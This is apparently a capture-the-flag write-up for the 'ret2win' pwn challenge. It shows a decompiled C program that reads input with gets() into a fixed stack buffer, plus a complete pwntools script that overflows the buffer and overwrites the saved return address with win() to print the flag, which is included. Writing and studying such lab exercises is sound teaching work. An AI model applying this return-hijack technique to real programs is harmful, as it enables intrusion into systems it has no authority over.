# [Pwn] ret2win

## 📚 Overview

> *"Buffer overflow di stack bisa kita gunakan untuk overwrite saved RIP. Kita bisa overwrite dengan alamat fungsi win untuk menjalankannya."*

## 💻 Decompiled Code

Basic buffer overflow challenge, there is no checking for input's length in `gets()` function hence we could overwrite the RIP on the stack. 

```c
void win(void)
{
  char flag [104];
  FILE *file;
  
  file = fopen("flag.txt","r");
  if (file == (FILE *)0x0) {
    puts("flag.txt not found");
    FUN_00401120(0xffffffff);
  }
  fgets(flag,100,file);
  fclose(file);
  printf("Wow, how did you get here? Here\'s the flag:\n%s\n",flag);
  return;
}

undefined8 main(void)
{
  char buffer [112];
  
  printf("Give me your payload: ");
  gets(buffer);
  return 0;
}
```

## ⚙ Full Script

**Payload >** Overflow the buffer to reach the stack, and then overwrite the RIP with `win()` address.

```python
from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

offset = 0x78
RET_ADDR = 0x40101a
WIN_ADDR = elf.symbols.win

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset + rop.chain()
p.sendlineafter(b"Give me your payload: ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCP1P{bisa_jalanin_fungsi_apapun_kan_jadinya_bang}

p.close()
```